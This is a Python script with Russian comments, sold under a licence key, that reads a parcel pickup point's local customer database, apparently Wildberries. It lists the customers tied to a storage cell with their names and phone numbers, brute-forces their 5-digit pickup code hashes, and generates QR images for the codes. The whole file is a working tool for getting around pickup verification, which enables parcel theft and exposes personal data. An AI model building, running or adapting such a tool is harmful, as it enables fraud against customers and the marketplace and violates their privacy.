"""
Подбор кодов по номеру ячейки — всё в одном.

Вводишь номер ячейки (напр. 46) -> скрипт сам:
  1) находит в базе всех клиентов этой ячейки и их SID,
  2) берёт их хеши кодов,
  3) перебирает каждый хеш и выдаёт SID + 5-значный код.

Запуск:
  - двойным кликом по файлу (спросит номер ячейки), или
  - python crack_cell.py 46
  - python crack_cell.py 46 --date 2026-06-24
"""

import argparse
import hashlib
import json
import os
import sqlite3
import subprocess
import sys
import time
import urllib.parse
import urllib.request
import uuid
from pathlib import Path
from typing import List, Optional

try:
    from argon2.low_level import Type, verify_secret
    HAS_ARGON2 = True
except ImportError:
    HAS_ARGON2 = False

CODE_LEN = 5
TOTAL = 10 ** CODE_LEN  # 100 000 вариантов

_APPDATA = os.environ.get("APPDATA") or str(Path.home() / "AppData" / "Roaming")
DEFAULT_DB_PATH = Path(_APPDATA) / "com.example" / "wb_point_desktop" / "wb_point_db.sqlite"

# ---------- лицензирование ----------
KEY_API = "https://shk-wb.vercel.app/api/license"
LICENSE_PATH = Path(_APPDATA) / "wb_pvz_tools" / "license.json"


def load_saved_key():
    try:
        with open(LICENSE_PATH, "r", encoding="utf-8") as f:
            return json.load(f).get("key")
    except (OSError, ValueError):
        return None


def save_key(key: str):
    try:
        LICENSE_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(LICENSE_PATH, "w", encoding="utf-8") as f:
            json.dump({"key": key}, f)
    except OSError:
        pass


def api_get_key(key: str):
    """GET /key?key=<value> -> запись dict или None. Бросает при сетевой ошибке."""
    url = KEY_API + "?key=" + urllib.parse.quote(key)
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    return data or None


def api_increment(record: dict):
    """PATCH /key/<id> {used: used+1}."""
    body = json.dumps({"key": record["key"]}).encode("utf-8")
    req = urllib.request.Request(
        KEY_API, data=body, method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        updated = json.loads(resp.read().decode("utf-8"))
    return updated["used"]


def try_key(key: str):
    """Проверить один ключ (без цикла ввода). Возвращает (запись|None, сообщение).

    При успехе сохраняет ключ на диск и возвращает валидную запись."""
    key = (key or "").strip()
    if not key:
        return None, "Ключ не введён."
    try:
        record = api_get_key(key)
    except Exception:
        return None, "Нет связи с сервером проверки. Нужен интернет."
    if not record:
        return None, "Неверный ключ."
    if not record.get("active", False):
        return None, "Ключ отозван."
    used = record.get("used") or 0
    limit = record.get("limit") or 0
    if used >= limit:
        return None, f"Лимит ключа исчерпан ({used}/{limit})."
    save_key(key)
    return record, f"Ключ принят. Осталось итераций: {limit - used}"


def ensure_license(log=print, ask_key=None):
    """Проверить ключ. Вернуть валидную запись или None (тогда программа завершается).

    Сохранённый ключ пробуем автоматически. Если он неверный / отозван /
    исчерпан — НЕ выходим, а предлагаем ввести новый ключ (купленный).

    ask_key: необязательный callback() -> str | None для запроса ключа у
    пользователя (по умолчанию — input() в консоли; GUI передаёт свой диалог)."""
    if ask_key is None:
        ask_key = lambda: input("Введите ключ доступа (или Enter для выхода): ").strip()

    saved = load_saved_key()
    while True:
        if saved:
            key = saved
            saved = None  # сохранённый пробуем один раз, дальше — спрашиваем
            from_saved = True
        else:
            key = (ask_key() or "").strip()
            if not key:
                log("Ключ не введён. Выход.")
                return None
            from_saved = False

        record, msg = try_key(key)
        if record is None:
            if from_saved:
                log("Сохранённый ключ больше недействителен. Введите новый ключ.")
            else:
                log(msg + " Попробуйте ещё раз.")
            continue

        log(msg)
        return record


# ---------- бесплатный пробный подбор (привязан к железу) ----------
TRIAL_API = "https://shk-wb.vercel.app/api/trial"


def hardware_id() -> str:
    """Best-effort идентификатор устройства (не анти-DRM, а защита от
    тривиального удаления/переустановки программы ради новой бесплатной
    попытки — сервер помнит железо, а не локальный файл)."""
    parts = []
    try:
        out = subprocess.check_output(
            ["wmic", "csproduct", "get", "uuid"],
            stderr=subprocess.DEVNULL, timeout=5,
        ).decode(errors="ignore")
        lines = [ln.strip() for ln in out.splitlines() if ln.strip() and "UUID" not in ln.upper()]
        if lines:
            parts.append(lines[0])
    except Exception:
        pass
    if not parts:
        parts.append(str(uuid.getnode()))  # фолбэк: MAC-адрес
    parts.append(os.environ.get("COMPUTERNAME", ""))
    raw = "|".join(parts)
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()


def trial_used(hwid: str) -> bool:
    """GET /trials?hwid=... -> True, если для этого устройства пробный подбор
    уже когда-либо был зарегистрирован (в т.ч. до переустановки программы).

    Пока коллекция /trials на mokky.dev ни разу не создавалась POST-ом,
    GET по ней отвечает 404 — это трактуется как «ещё не использован»."""
    url = TRIAL_API + "?hwid=" + urllib.parse.quote(hwid)
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return False
        raise
    return bool(data.get("used"))


def trial_claim(hwid: str) -> bool:
    """Зарегистрировать использование пробного подбора для устройства.
    Вызывать ТОЛЬКО когда код реально найден. True — успешно зарегистрировано
    (это была первая и единственная бесплатная попытка), False — уже было
    зарегистрировано ранее (в т.ч. гонка параллельных попыток)."""
    if trial_used(hwid):
        return False
    body = json.dumps({"hwid": hwid}).encode("utf-8")
    req = urllib.request.Request(
        TRIAL_API, data=body, method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    return bool(data.get("claimed"))


# ---------- работа с базой ----------

def connect_readonly(db_path: Path) -> sqlite3.Connection:
    uri = f"file:{db_path.as_posix()}?mode=ro"
    con = sqlite3.connect(uri, uri=True)
    con.row_factory = sqlite3.Row
    return con


def sids_for_cell(con, cell: str):
    rows = con.execute(
        "select user_sid from buyers_with_cells where cast(cell as text) = ?",
        (cell,),
    ).fetchall()
    return [str(r["user_sid"]) for r in rows]


def info_for_sid(con, sid: str):
    r = con.execute(
        "select mobile, name from buyers where cast(user_sid as text) = ?", (sid,)
    ).fetchone()
    return (r["mobile"], r["name"]) if r else (None, None)


def goods_for_sid(con, sid: str):
    """Штрихкоды/товары клиента из всех известных источников (для показа в модалке).
    Возвращает список dict: source, cell, sticker_code, barcode, scanned_code."""
    sources = [
        ("goods_in_pick_point", "cell, sticker_code, barcode, scanned_code"),
        ("smart_pvz_goods", "cell, sticker_code, barcode, scanned_code"),
        ("goods_on_way", "null as cell, sticker_code, barcode, null as scanned_code"),
    ]
    result = []
    for table, cols in sources:
        try:
            rows = con.execute(
                f"select distinct '{table}' as source, {cols} from {table} "
                f"where cast(buyer_sid as text) = ?",
                (sid,),
            ).fetchall()
        except sqlite3.OperationalError:
            continue
        for r in rows:
            result.append({
                "source": r["source"],
                "cell": r["cell"],
                "sticker_code": r["sticker_code"],
                "barcode": r["barcode"],
                "scanned_code": r["scanned_code"],
            })
    return result


def hashes_for_sid(con, sid: str):
    r = con.execute(
        "select date_code_hashes from buyers_hashes where cast(buyer_sid as text) = ?",
        (sid,),
    ).fetchone()
    if not r or not r["date_code_hashes"]:
        return []
    try:
        return json.loads(r["date_code_hashes"])
    except (ValueError, TypeError):
        return []


# ---------- подбор кода ----------

def make_qr_payload(payload: str):
    """Сгенерировать QR из готовой строки (напр. 47296085_33430) и открыть картинку."""
    try:
        import qrcode  # pip install "qrcode[pil]"
    except ImportError:
        print('  (QR не создан — установите пакет: pip install "qrcode[pil]")')
        return
    out_dir = Path.home() / "Desktop"
    out_path = out_dir / f"qr_{payload}.png"
    qrcode.make(payload).save(out_path)
    print(f"  QR: {payload}  ->  {out_path}")
    try:
        import os
        os.startfile(out_path)  # откроет картинку (Windows)
    except Exception:
        pass


def make_qr(sid: str, code: str):
    """Сгенерировать QR из строки вида 47296085_33430 и открыть картинку."""
    make_qr_payload(f"{sid}_{code}")


def today_str() -> str:
    from datetime import date
    return date.today().isoformat()  # YYYY-MM-DD


def is_md5(h: str) -> bool:
    h = h.strip().lower()
    return len(h) == 32 and all(c in "0123456789abcdef" for c in h)


def crack_md5(sid: str, target: str):
    target = target.strip().lower()
    start = time.perf_counter()
    for i in range(TOTAL):
        c = f"{i:0{CODE_LEN}d}"
        if hashlib.md5((sid + c).encode()).hexdigest() == target:
            return c, time.perf_counter() - start
    return None, time.perf_counter() - start


def crack_argon2(sid: str, target: str, log=print, on_progress=None):
    if not HAS_ARGON2:
        return "argon2-not-installed", 0.0
    enc = target.strip().encode()
    start = time.perf_counter()
    for i in range(TOTAL):
        c = f"{i:0{CODE_LEN}d}"
        secret = (sid + c).encode()
        try:
            if verify_secret(enc, secret, Type.ID):
                return c, time.perf_counter() - start
        except Exception:
            pass
        if i and i % 500 == 0:
            el = time.perf_counter() - start
            speed = i / el
            left = (TOTAL - i) / speed
            if on_progress:
                on_progress(i, TOTAL, speed, left)
            else:
                log(f"\r    проверено {i:,}/{TOTAL:,}".replace(",", " ") +
                    f"  ~{speed:.0f}/сек  осталось ~{left/60:.0f} мин   ")
    return None, time.perf_counter() - start


def crack_one(sid: str, h: str):
    """Вернуть подобранный код (или None) для одного хеша."""
    if h.startswith("$argon2"):
        return crack_argon2(sid, h)
    return crack_md5(sid, h)


# ---------- предыдущие клиенты ячейки ----------

def previous_clients_for_cell(con, cell: str, limit: Optional[int] = None):
    """Клиенты, которые уже ЗАБРАЛИ заказ из этой ячейки (история).
    Возвращает список (sid, дата_получения) — самые недавние первыми."""
    rows = con.execute(
        "select cast(buyer_sid as text) as sid, max(status_updated) as upd "
        "from goods_in_pick_point "
        "where cast(cell as text) = ? and status = 'GOODS_RECIEVED' "
        "group by buyer_sid order by upd desc",
        (str(cell),),
    ).fetchall()
    res = [(r["sid"], (r["upd"] or "")[:10]) for r in rows]
    return res[:limit] if limit else res


def codes_for_sid_on_date(con, sid: str, date: str):
    """ВСЕ подобранные md5-коды клиента за указанную дату (без дублей).
    Если на эту дату кодов нет — берём самую свежую доступную дату.
    Возвращает (список_кодов, дата)."""
    entries = hashes_for_sid(con, sid)
    if not entries:
        return [], None

    def all_codes(day_entries):
        out = []
        for e in day_entries:
            h = e.get("code_hash", "")
            if h and is_md5(h):
                c, _ = crack_md5(sid, h)
                if c and c not in out:
                    out.append(c)
        return out

    day = [e for e in entries if e.get("date") == date]
    codes = all_codes(day)
    if codes:
        return codes, date

    # fallback: самая свежая дата с md5
    dates = sorted({e.get("date", "") for e in entries
                    if is_md5(e.get("code_hash", ""))})
    if dates:
        d = dates[-1]
        return all_codes([e for e in entries if e.get("date") == d]), d
    return [], None


def show_previous_clients(con, cell: str, count: int, collected: list, log=print):
    """Показать предыдущих клиентов ячейки и ВСЕ их коды."""
    prev = previous_clients_for_cell(con, cell, count)
    log("=" * 70)
    log(f"Предыдущие клиенты ячейки {cell} (уже забрали заказ):")
    if not prev:
        log("  Истории по этой ячейке нет.")
        return False
    found_any = False
    for sid, date in prev:
        mobile, name = info_for_sid(con, sid)
        codes, used_date = codes_for_sid_on_date(con, sid, date)
        head = f"  Забрал {date}  |  {name or '-'}  {mobile or '-'}  (SID={sid})"
        log(head)
        if codes:
            tail = "" if used_date == date else f"  (коды за {used_date})"
            log(f"      найдено кодов: {len(codes)}{tail}")
            for c in codes:
                log(f"      КОД = {c}    (связка {sid}_{c})")
                collected.append({
                    "sid": sid, "code": c, "date": date,
                    "phone": mobile, "name": name, "kind": "history",
                })
            found_any = True
        else:
            log("      код недоступен (хеши уже удалены из базы)")
            collected.append({
                "sid": sid, "code": None, "date": date,
                "phone": mobile, "name": name, "kind": "unavailable",
            })
    return found_any


# ---------- основной проход ----------

def process_sid(con, sid: str, cell: Optional[str], date_filter: Optional[str],
                all_dates: bool = False, collected: Optional[list] = None,
                log=print, auto_qr: bool = True):
    if collected is None:
        collected = []
    mobile, name = info_for_sid(con, sid)
    header = f"SID={sid}"
    if cell is not None:
        header = f"Ячейка {cell}  |  " + header
    log("=" * 70)
    log(header)
    log(f"Телефон: {mobile or '-'}   Имя: {name or '-'}")
    log("-" * 70)

    entries = hashes_for_sid(con, sid)
    found_any = False

    if all_dates:
        # Полный режим — показать все коды по всем датам.
        for e in entries:
            h = e.get("code_hash", "")
            date = e.get("date", "")
            if not h or not is_md5(h):
                continue
            code, _ = crack_md5(sid, h)
            if code:
                log(f"  {date}:  КОД = {code}    (связка {sid}_{code})")
                collected.append({
                    "sid": sid, "code": code, "date": date,
                    "phone": mobile, "name": name, "kind": "current",
                })
                found_any = True
        return found_any

    # Обычный режим: одна дата (по умолчанию — сегодня) и ПОСЛЕДНИЙ подобранный код.
    target_date = date_filter or today_str()
    day_entries = [e for e in entries if e.get("date") == target_date]
    if not day_entries:
        log(f"  На дату {target_date} записей нет.")
        collected.append({
            "sid": sid, "code": None, "date": target_date,
            "phone": mobile, "name": name, "kind": "no-data",
        })
        return False

    codes = []
    for e in day_entries:
        h = e.get("code_hash", "")
        if not h or not is_md5(h):
            continue
        code, _ = crack_md5(sid, h)
        if code and code not in codes:
            codes.append(code)

    if codes:
        log(f"  {target_date}:  найдено кодов: {len(codes)}")
        for code in codes:
            log(f"      КОД = {code}    (связка {sid}_{code})")
            collected.append({
                "sid": sid, "code": code, "date": target_date,
                "phone": mobile, "name": name, "kind": "current",
            })
        # авто-QR только если код один; иначе пользователь выберет в промпте
        if auto_qr and len(codes) == 1:
            make_qr(sid, codes[0])
        found_any = True
    else:
        log(f"  {target_date}:  код не найден")
        collected.append({
            "sid": sid, "code": None, "date": target_date,
            "phone": mobile, "name": name, "kind": "not-found",
        })

    return found_any


# ---------- все клиенты ячейки (любой статус) ----------

# Перевод статусов товара WB на русский для колонки «Статус».
STATUS_RU = {
    "GOODS_READY": "Готов к выдаче",
    "GOODS_RECIEVED": "Получен",
    "GOODS_DECLINED": "Отмена / отказ",
}
# Приоритет при схлопывании нескольких статусов одного клиента в ячейке.
_STATUS_PRIORITY = {"GOODS_READY": 0, "GOODS_DECLINED": 1, "GOODS_RECIEVED": 2}


# ---------- история получения/отказов по SID ----------

def pickup_history_for_sid(con, sid: str):
    """Все события получения/отказа этого клиента: статус, дата-время, штрихкоды.

    Возвращает список dict (самые недавние первыми), сгруппированный по
    (status, status_updated) — один заказ может состоять из нескольких товаров
    с одним и тем же временем выдачи/отказа, их штрихкоды объединяются."""
    rows = con.execute(
        "select status, status_updated, sticker_code, barcode, scanned_code "
        "from goods_in_pick_point "
        "where cast(buyer_sid as text) = ? and status in ('GOODS_RECIEVED', 'GOODS_DECLINED')",
        (sid,),
    ).fetchall()
    grouped: dict = {}
    for r in rows:
        key = (r["status"], r["status_updated"] or "")
        grouped.setdefault(key, []).append(r)
    result = []
    for (status, dt), items in grouped.items():
        codes = sorted({
            str(it[col]) for it in items for col in ("sticker_code", "barcode", "scanned_code")
            if it[col]
        })
        result.append({
            "status": status,
            "status_ru": STATUS_RU.get(status, status),
            "datetime": dt,
            "codes": codes,
        })
    result.sort(key=lambda e: e["datetime"], reverse=True)
    return result


def clients_for_cell(con, cell: str):
    """ВСЕ клиенты, чьи товары лежат в этой ячейке, независимо от статуса.
    Возвращает список (sid, status, date) — по одной записи на клиента
    (при нескольких статусах берётся приоритетный)."""
    rows = con.execute(
        "select cast(buyer_sid as text) as sid, status, max(status_updated) as upd "
        "from goods_in_pick_point where cast(cell as text) = ? "
        "group by buyer_sid, status",
        (str(cell),),
    ).fetchall()
    by_sid: dict = {}
    for r in rows:
        sid = r["sid"]
        status = r["status"] or ""
        date = (r["upd"] or "")[:10]
        prio = _STATUS_PRIORITY.get(status, 99)
        cur = by_sid.get(sid)
        if cur is None or prio < cur[0]:
            by_sid[sid] = (prio, status, date)
    return [(sid, v[1], v[2]) for sid, v in by_sid.items()]


def collect_cell_clients(con, cell: str, collected: list, log=print):
    """Показать всех клиентов ячейки (любой статус) и подобрать коды там, где
    в базе сохранён хеш. Кладёт записи в collected (формат для GUI). Возвращает
    True, если хотя бы у одного клиента найден код."""
    clients = clients_for_cell(con, cell)
    log("=" * 70)
    log(f"Все клиенты ячейки {cell}: {len(clients)}")
    if not clients:
        log("  Товаров по этой ячейке в базе нет.")
        return False

    found_any = False
    today = today_str()
    # Сначала «Готов к выдаче», затем отмены, затем полученные; внутри — по дате.
    clients.sort(key=lambda c: (_STATUS_PRIORITY.get(c[1], 99), c[2]), reverse=False)
    for sid, status, date in clients:
        mobile, name = info_for_sid(con, sid)
        status_ru = STATUS_RU.get(status, status or "-")
        # Код клиента меняется КАЖДЫЙ ДЕНЬ. Для выдачи/возврата ПРЯМО СЕЙЧАС нужен
        # код за СЕГОДНЯ, а не за дату отмены/получения товара — иначе WB скажет
        # «код клиента устарел». Берём сегодняшний; если его нет — ближайший
        # доступный, но помечаем это явно.
        codes, used_date = codes_for_sid_on_date(con, sid, today)
        head = f"  {status_ru}  |  {name or '-'}  {mobile or '-'}  (SID={sid})"
        log(head)
        if codes:
            stale = used_date != today
            tail = "" if not stale else f"  (кода за сегодня нет; показан за {used_date} — может устареть)"
            log(f"      найдено кодов: {len(codes)}{tail}")
            for c in codes:
                log(f"      КОД = {c}    (связка {sid}_{c})")
                collected.append({
                    "sid": sid, "code": c, "date": used_date or today,
                    "phone": mobile, "name": name,
                    "status_ru": status_ru, "kind": "stale" if stale else "ok",
                })
            found_any = True
        else:
            # различаем: хеша вообще нет vs хеши есть, но не раскрылись
            if hashes_for_sid(con, sid):
                log("      код не найден")
                kind = "not-found"
            else:
                log("      код не хранится в базе")
                kind = "no-hash"
            collected.append({
                "sid": sid, "code": None, "date": date,
                "phone": mobile, "name": name,
                "status_ru": status_ru, "kind": kind,
            })
    return found_any


# ---------- запуск ----------

def run(db_path: Path, cell: Optional[str], sid: Optional[str], date_filter: Optional[str],
        all_dates: bool = False, prev_count: int = 0, log=print, auto_qr: bool = True):
    if not db_path.exists():
        log(f"База не найдена: {db_path}")
        return 1, False, []
    found_any = False
    collected: list = []
    with connect_readonly(db_path) as con:
        if sid:
            found_any = process_sid(con, sid, None, date_filter, all_dates, collected,
                                     log=log, auto_qr=auto_qr)
        else:
            # Поиск по ячейке: показываем ВСЕХ клиентов ячейки с любым статусом.
            found_any = collect_cell_clients(con, cell, collected, log=log)
    return 0, found_any, collected


def main() -> int:
    p = argparse.ArgumentParser(description="Подбор кодов по номеру ячейки.")
    p.add_argument("cell", nargs="?", help="Номер ячейки, напр. 46")
    p.add_argument("--db", default=str(DEFAULT_DB_PATH), help="Путь к sqlite БД")
    p.add_argument("--sid", help="client_sid напрямую (вместо ячейки)")
    p.add_argument("--date", help="Дата YYYY-MM-DD (по умолчанию — сегодня)")
    p.add_argument("--all", action="store_true",
                   help="Показать коды по всем датам (по умолчанию — один код за сегодня)")
    p.add_argument("--prev", type=int, nargs="?", const=5, default=0, metavar="N",
                   help="Показать N предыдущих клиентов ячейки и их коды (по умолч. 5)")
    args = p.parse_args()

    # Проверка лицензионного ключа до любой работы.
    record = ensure_license()
    if record is None:
        if not sys.argv[1:]:
            input("\nНажмите Enter, чтобы закрыть...")
        return 1

    cell = args.cell
    sid = args.sid
    prev_count = args.prev
    # Если запустили без аргументов (двойной клик) — спросить ячейку.
    if not cell and not sid:
        cell = input("Введите номер ячейки: ").strip()
        if not cell:
            print("Номер ячейки не введён.")
            return 1
        # Дополнительно спросить про предыдущих клиентов ячейки.
        ans = input("Показать предыдущих клиентов ячейки? "
                    "Сколько (Enter — пропустить): ").strip()
        if ans:
            try:
                prev_count = int(ans)
            except ValueError:
                prev_count = 5

    code, found_any, collected = run(
        Path(args.db), cell, sid, args.date, args.all, prev_count)

    # Списываем 1 итерацию только при успешно найденном коде.
    if found_any:
        try:
            new_used = api_increment(record)
            remaining = (record.get("limit") or 0) - new_used
            print(f"\nСписана 1 итерация. Осталось: {max(remaining, 0)}")
        except Exception:
            print("\n(Не удалось списать итерацию — нет связи с сервером.)")

    # В интерактивном режиме предложить сделать QR для любого кода из списка.
    if not sys.argv[1:]:
        sids_seen = sorted({e["sid"] for e in collected})
        while True:
            raw = input(
                "\nСделать QR-картинку? Введите просто КОД (например 59892) "
                "или связку SID_код, Enter — пропустить: "
            ).strip()
            if not raw:
                break
            # Связка целиком — как раньше.
            if "_" in raw:
                make_qr_payload(raw)
                continue
            # Просто код — сами подставим SID.
            if not raw.isdigit():
                print("  Введите код цифрами или связку вида SID_код.")
                continue
            owners = [e["sid"] for e in collected if e["code"] == raw]
            if owners:
                make_qr(owners[0], raw)
            elif len(sids_seen) == 1:
                make_qr(sids_seen[0], raw)
            elif sids_seen:
                print("  Несколько SID — уточните связку SID_код. Доступные SID:")
                for s in sids_seen:
                    print(f"    {s}")
            else:
                print("  Нет данных по SID — введите связку вида SID_код.")

    # Чтобы окно не закрылось мгновенно при двойном клике.
    if not sys.argv[1:]:
        input("\nГотово. Нажмите Enter, чтобы закрыть...")
    return code


if __name__ == "__main__":
    raise SystemExit(main())
